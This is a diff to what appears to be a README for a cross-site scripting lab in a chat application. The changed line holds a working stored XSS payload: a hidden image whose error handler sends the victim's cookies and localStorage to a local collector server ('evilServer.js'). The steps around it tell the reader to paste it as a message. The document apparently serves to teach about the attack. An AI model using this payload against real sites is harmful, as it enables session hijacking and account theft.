@@ -16,7 +16,7 @@ Open a terminal and navigate to the project's root directory.
 3. Paste the following malicious message in the chat and press "Send":
 
 ```
-How's it going? <img style="display:none;" src="http://url.to.file.which/not.exist" onerror="javascript:fetch('http://localhost:5000', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ localStorage: Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`), cookies: document.cookie })}); alert(`I just stole your auth cookie ${document.cookie} and the contents of your localStorage ${Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`)}`);">
+How's it going? <img style="display:none;" src="http://url.to.file.which/not.exist" onerror="fetch('http://localhost:5000', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ localStorage: Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`), cookies: document.cookie })}); alert(`I just stole your auth cookie ${document.cookie} and the contents of your localStorage ${Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`)}`);">
 ```
 
 4. Check the terminal that's running `evilServer.js` - You'll see both the sender (attacker) and recipient's cookies and localStorage have been stolen and logged!
